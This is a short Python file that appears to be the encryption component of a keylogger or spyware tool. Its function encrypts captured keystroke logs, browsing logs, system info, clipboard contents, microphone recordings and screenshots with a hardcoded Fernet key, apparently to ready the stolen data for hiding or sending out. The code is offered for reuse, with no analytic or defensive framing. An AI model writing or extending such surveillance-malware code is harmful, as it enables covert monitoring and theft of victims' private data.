import os  # Import the module for interacting with the operating system
from cryptography.fernet import Fernet  # Import the module for encryption

# Function to encrypt files
def encrypt_files(file_path):
    # Define the encryption key
    key = b'h9o1i5n5tO3W_LpEWyirtgQAKSADB3h_AyXQpH407wQ='  # Replace with your own encryption key

    # Encryption logic using the encryption key
    fernet = Fernet(key)

    # Define the files to be encrypted and their corresponding encrypted file names
    files_to_encrypt = [
        os.path.join(file_path, "f_keystroke.txt"),
        os.path.join(file_path, "f_website.log"),
        os.path.join(file_path, "f_sysinfo.txt"),
        os.path.join(file_path, "f_clipboard.txt"),
        os.path.join(file_path, "f_microphone.wav"),
        os.path.join(file_path, "f_screenshot.png"),
        os.path.join(file_path, "f_logs.zip")
    ]
    encrypted_file_names = [
        os.path.join(file_path, "keystroke_e.log"),
        os.path.join(file_path, "website_e.log"),
        os.path.join(file_path, "sysinfo_e.txt"),
        os.path.join(file_path, "clipboard_e.txt"),
        os.path.join(file_path, "microphone_e.wav"),
        os.path.join(file_path, "screenshot_e.png"),
        os.path.join(file_path, "logs_e.zip")
    ]

    # Encrypt each file using the encryption key
    for file_to_encrypt, encrypted_file_name in zip(files_to_encrypt, encrypted_file_names):
        with open(file_to_encrypt, 'rb') as file:
            data = file.read()

        encrypted_data = fernet.encrypt(data)

        with open(encrypted_file_name, 'wb') as encrypted_file:
            encrypted_file.write(encrypted_data)
